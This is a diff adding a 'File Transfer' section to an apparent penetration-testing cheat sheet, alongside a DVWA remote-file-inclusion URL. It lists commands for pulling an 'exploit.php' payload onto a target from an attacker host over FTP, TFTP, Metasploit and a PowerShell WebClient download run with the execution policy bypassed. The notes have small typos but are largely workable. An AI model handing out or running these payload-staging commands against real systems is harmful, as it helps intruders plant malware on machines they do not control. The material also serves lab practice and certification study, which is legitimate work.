@@ -662,6 +662,60 @@ on DVWA the page is called via parameter "?page=" enter here the malicious page 
 
     dvwa.com/vulnerabilites/fi/?page=http://10.0.2.6/exploit.php
 
+**File Transfer**
+
+*ftp hosting with python*
+
+    apt-get install python-pyftpdlib
+    go to the folder you want to use
+    python -m pyftpdlib -p 21
+    p for port
+
+*get files over windows shell*
+
+    ftp <ip>
+    binary - so the files are having the correct chars
+
+*script it*
+
+    echo open <ip> ftp.txt
+    echo anonymous >> ftp.txt
+    echo pass >> ftp.txt
+    echo get exploit.php >> ftp.txt
+    echo bye >> gtp.txt
+
+    ftp -s:ftp.txt
+
+There should not be spaces in there
+
+*host with msfconsole*
+
+    use auxiliary/server/ftp
+    exploit
+
+For old windows machines
+
+*TFTP*
+
+    On Linux
+    atftpd --daemon --port 69 /var/www/html
+
+    On Windows
+    tftp -i <ip> get exploit.php
+
+*Powershell*
+
+    echo $storage = $pwd > get.ps1
+    echo $webclient = New-Object System.Net.Webclient >> get.ps1
+    echo $url = "http://<ip>/exploit.php" >> get.ps1
+    echo $file = "exploit.php" >> get.ps1
+    echo $webclient.DownloadFile($url,$file) >> get.ps1
+
+    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File get.ps1
+
+    Also works as oneliner 
+    echo $storage = $pwd&$webclient = New-Object System.Net.Webclient&$url = "http://<ip>/exploit.php"&$file = "exploit.php"&$webclient.DownloadFile($url,$file) >> get.ps1
+
 
 
 
